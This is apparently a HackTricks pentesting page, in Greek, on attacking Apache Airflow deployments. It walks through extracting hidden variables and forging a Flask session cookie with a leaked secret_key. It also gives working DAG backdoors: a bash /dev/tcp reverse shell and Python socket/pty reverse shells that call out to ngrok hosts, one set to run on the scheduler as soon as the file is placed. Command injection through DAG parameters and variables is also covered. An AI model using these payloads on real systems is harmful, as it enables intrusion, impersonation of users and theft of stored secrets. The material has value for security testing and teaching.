# Ασφάλεια Apache Airflow

<details>

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκερ υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

## Βασικές Πληροφορίες

[**Το Apache Airflow**](https://airflow.apache.org) λειτουργεί ως πλατφόρμα για το **συγχρονισμό και τον προγραμματισμό αγωγών δεδομένων ή ροών εργασιών**. Ο όρος "συγχρονισμός" στο πλαίσιο των αγωγών δεδομένων σημαίνει τη διαδικασία οργάνωσης, συντονισμού και διαχείρισης πολύπλοκων ροών δεδομένων που προέρχονται από διάφορες πηγές. Ο κύριος σκοπός αυτών των συγχρονισμένων αγωγών δεδομένων είναι να παρέχουν επεξεργασμένα και καταναλώσιμα σύνολα δεδομένων. Αυτά τα σύνολα δεδομένων χρησιμοποιούνται εκτενώς από μια ποικιλία εφαρμογών, συμπεριλαμβανομένων αλλά όχι περιοριστικά εργαλείων επιχειρηματικής νοημοσύνης, επιστήμης δεδομένων και μοντέλων μηχανικής μάθησης, τα οποία είναι θεμελιώδη για τη λειτουργία εφαρμογών μεγάλων δεδομένων.

Βασικά, το Apache Airflow θα σας επιτρέψει να **προγραμματίσετε την εκτέλεση κώδικα όταν κάτι** (συμβάν, cron) **συμβεί**.

## Τοπικό Εργαστήριο

### Docker-Compose

Μπορείτε να χρησιμοποιήσετε το **αρχείο διαμόρφωσης docker-compose από** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) για να ξεκινήσετε ένα πλήρες περιβάλλον apache airflow docker. (Αν βρίσκεστε σε MacOS βεβαιωθείτε ότι δίνετε τουλάχιστον 6GB RAM στο docker VM).

### Minikube

Ένα εύκολο τρόπος **εκτέλεσης του apache airflow** είναι να το **τρέξετε με το minikube**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Ρύθμιση του Airflow

Το Airflow μπορεί να αποθηκεύει **ευαίσθητες πληροφορίες** στη ρύθμισή του ή μπορείτε να βρείτε αδύναμες ρυθμίσεις:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Πριν ξεκινήσετε επίθεση στο Airflow, πρέπει να κατανοήσετε **πώς λειτουργούν οι άδειες πρόσβασης**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## Επιθέσεις

### Απαρίθμηση Κονσόλας Ιστού

Αν έχετε **πρόσβαση στην κονσόλα ιστού**, μπορείτε να έχετε πρόσβαση σε ορισμένες ή όλες τις παρακάτω πληροφορίες:

* **Μεταβλητές** (Εδώ μπορεί να αποθηκεύονται προσαρμοσμένες ευαίσθητες πληροφορίες)
* **Συνδέσεις** (Εδώ μπορεί να αποθηκεύονται προσαρμοσμένες ευαίσθητες πληροφορίες)
* Προσπελάστε τις στο `http://<airflow>/connection/list/`
* [**Ρύθμιση**](./#airflow-configuration) (Ευαίσθητες πληροφορίες όπως το **`secret_key`** και κωδικοί μπορεί να αποθηκεύονται εδώ)
* Λίστα **χρηστών & ρόλων**
* **Κώδικας κάθε DAG** (ο οποίος μπορεί να περιέχει ενδιαφέρουσες πληροφορίες)

### Ανάκτηση Τιμών Μεταβλητών

Οι μεταβλητές μπορούν να αποθηκευτούν στο Airflow ώστε οι **DAGs** να μπορούν να **έχουν πρόσβαση** στις τιμές τους. Είναι παρόμοιο με τα μυστικά άλλων πλατφορμών. Αν έχετε **επαρκείς δικαιώματα πρόσβασης**, μπορείτε να τις προσπελάσετε στη γραφική διεπαφή στο `http://<airflow>/variable/list/`.\
Το Airflow από προεπιλογή θα εμφανίσει την τιμή της μεταβλητής στη γραφική διεπαφή, ωστόσο, σύμφωνα με [**αυτό**](https://marclamberti.com/blog/variables-with-apache-airflow/), είναι δυνατόν να οριστεί μια **λίστα μεταβλητών** των οποίων η **τιμή** θα εμφανίζεται ως **αστεράκια** στη **γραφική διεπαφή**.

![](<../../.gitbook/assets/image (164).png>)

Ωστόσο, αυτές οι **τιμές** μπορούν ακόμα να **ανακτηθούν** μέσω **CLI** (χρειάζεστε πρόσβαση στη βάση δεδομένων), εκτέλεση **αυθαίρετου DAG**, **API** προσπελάστε το σημείο πρόσβασης των μεταβλητών (το API πρέπει να ενεργοποιηθεί) και **ακόμα και η ίδια η γραφική διεπαφή!**\
Για να αποκτήσετε πρόσβαση σε αυτές τις τιμές από τη γραφική διεπαφή, απλά **επιλέξτε τις μεταβλητές** που θέλετε να αποκτήσετε πρόσβαση και **κάντε κλικ στις Ενέργειες -> Εξαγωγή**.\
Ένας άλλος τρόπος είναι να πραγματοποιήσετε μια **επίθεση βίας** στην **κρυφή τιμή** χρησιμοποιώντας το **φιλτράρισμα αναζήτησης** μέχρι να την ανακτήσετε:

![](<../../.gitbook/assets/image (152).png>)

### Ανόδος Προνομίων

Αν η ρύθμιση **`expose_config`** είναι ορισμένη σε **True**, από τον **ρόλο Χρήστη** και **πάνω** μπορούν να **διαβάσουν** τη **διαμόρφωση στον ιστό**. Σε αυτή τη ρύθμιση, εμφανίζεται το **`secret_key`**, που σημαίνει ότι οποιοσδήποτε χρήστης με αυτόν τον έγκυρο κωδικό μπορεί να **δημιουργήσει το δικό του υπογεγραμμένο cookie για να προσωποποιήσει οποιονδήποτε άλλο λογαριασμό χρήστη**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### Παρασκήνιο DAG (RCE στο Airflow worker)

Εάν έχετε **πρόσβαση εγγραφής** στον τόπο όπου οι **DAGs αποθηκεύονται**, μπορείτε απλά **να δημιουργήσετε έναν** που θα σας στείλει ένα **αντίστροφο κέλυφος.**\
Σημειώστε ότι αυτό το αντίστροφο κέλυφος θα εκτελεστεί μέσα σε ένα **δοχείο εργασίας του airflow**:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### Παρασκήνιο DAG (RCE στον Airflow scheduler)

Εάν ορίσετε κάτι να **εκτελείται στη ρίζα του κώδικα**, στη στιγμή της συγγραφής αυτής, θα **εκτελεστεί από τον προγραμματιστή** μετά από λίγα δευτερόλεπτα μετά την τοποθέτησή του μέσα στον φάκελο του DAG.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### Δημιουργία DAG

Εάν καταφέρετε να **διακινδυνεύσετε ένα μηχάνημα μέσα στο cluster DAG**, μπορείτε να δημιουργήσετε νέα **scripts DAGs** στον φάκελο `dags/` και θα **αντιγραφούν στα υπόλοιπα μηχανήματα** μέσα στο cluster DAG.

### Εισαγωγή Κώδικα στο DAG

Όταν εκτελείτε ένα DAG από το GUI μπορείτε να **περάσετε ορίσματα** σε αυτό.\
Συνεπώς, εάν το DAG δεν έχει κωδικοποιηθεί σωστά, θα μπορούσε να είναι **ευάλωτο στην Εισαγωγή Εντολών.**\
Αυτό συνέβη σε αυτό το CVE: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Το μόνο που πρέπει να γνωρίζετε για να **ξεκινήσετε την αναζήτηση εισαγωγών εντολών στα DAGs** είναι ότι τα **παράμετρα** προσπελαύνονται με τον κώδικα **`dag_run.conf.get("param_name")`**.

Επιπλέον, η ίδια ευπάθεια μπορεί να συμβεί με τις **μεταβλητές** (σημειώστε ότι με επαρκή δικαιώματα θα μπορούσατε να **ελέγχετε την τιμή των μεταβλητών** στο GUI). Οι μεταβλητές προσπελαύνονται με:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Εάν χρησιμοποιηθούν για παράδειγμα μέσα σε ένα bash command, θα μπορούσατε να εκτελέσετε ένα command injection.

<details>

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
